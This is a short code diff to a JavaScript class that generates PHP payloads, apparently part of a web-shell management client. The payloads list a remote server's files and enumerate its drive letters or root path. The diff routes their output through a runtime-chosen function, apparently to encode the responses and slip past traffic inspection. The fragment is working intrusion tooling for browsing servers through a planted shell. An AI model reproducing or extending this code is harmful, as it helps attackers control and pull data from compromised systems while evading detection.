@@ -19,7 +19,8 @@ export default class File {
                 $res .= $value . '\`\`' . (is_dir($file) ? '1' : '0') . '\`\`' . date("Y/m/d H:i", filemtime($file)) . '\`\`' . @filesize($file);
                 $res .= "\\n";
             }
-            echo $res;
+            $d_f = '${this.arg2}'; 
+            echo $d_f($res); 
         }
         `
     }
@@ -34,10 +35,10 @@ export default class File {
             foreach (range("C", "Z") as $L) if (is_dir("{$L}:")) $root_path .= "{$L}:|";
         } else {
             $root_path .= "/";
-        }
-        echo $root_path . '\`\`' . $path;
+        } 
+        $d_f = '${this.arg1}'; 
+        echo $d_f($root_path . '\`\`' . $path); 
         `
-
     }
 
     download() {
